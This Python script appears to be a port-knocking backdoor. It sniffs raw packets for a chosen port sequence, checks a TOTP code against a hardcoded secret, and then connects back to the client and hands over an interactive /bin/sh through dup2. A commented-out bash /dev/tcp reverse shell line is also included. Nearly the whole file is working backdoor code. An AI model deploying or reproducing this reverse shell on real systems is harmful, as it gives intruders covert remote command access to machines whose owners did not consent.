from pypacker import psocket
from pypacker.layer12 import ethernet
from pypacker.layer4 import tcp
from time import time
import pyotp 
import socket 
import subprocess
import os


def port_knocking(ports, timeout):
  """ Monitor connections on specific ports, if the Port Knocking is completed ... """

  my_socket = psocket.SocketHndl(iface_name=None)
  current_port = current_time = 0

  while (current_port < len(ports)):
    bts = my_socket.recv()
    pkt = ethernet.Ethernet(bts)

    if ((pkt[tcp.TCP] is not None) and (pkt[tcp.TCP]).dport == ports[current_port]): 
      if ((current_port != 0) and (time() - current_time > timeout)):
        current_port = current_time = 0
      else:
        print ("Recebeu!")
        current_port += 1
        current_time = time()


def check_OTP(port_otp):
  """ Open specific port to receive OTP password """

  otp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  otp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
  otp_socket.bind(('127.0.0.1', port_otp)) 
  otp_socket.listen(1) 
  con, client = otp_socket.accept() 
  client_value = con.recv(1024).decode().strip()
  otp_socket.close() 

  totp = pyotp.TOTP('2UZC3V2WGD2OHNDP')
  if (totp.verify(client_value)):
    print("Aceito!")
    return client[0]
  else:
    print("Rejeitado!")


def reverse_shell(client_ip, port_reverse_shell):
  """ Send shell to client """

  shell_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  shell_socket.connect((client_ip, port_reverse_shell))
  os.dup2(shell_socket.fileno(),0)
  os.dup2(shell_socket.fileno(),1) 
  os.dup2(shell_socket.fileno(),2)
  subprocess.call(["/bin/sh","-i"])

  # command = "bash -i >& /dev/tcp" + cliente[0] + "/12345 0>&1"
  # subprocess.run(command.split(), shell = True, check = True) 


if __name__ == '__main__':
  while 1:
    try:
      ports_list = [int(x) for x in input("Type ports sequence (e.g. 12345 1337 5000): ").split()]
      timeout = int(input("Timeout (in seconds) between each port connection: "))
      port_otp = int(input("Type the port that will receive the OTP value: "))
      port_reverse_shell = int(input("Type the port that will receive the reverse shell: "))
      break
    except ValueError:
      print ("\nERROR! Incorrect value type!")

  port_knocking(ports_list, timeout)
  client_ip = check_OTP(port_otp)
  reverse_shell(client_ip, port_reverse_shell)
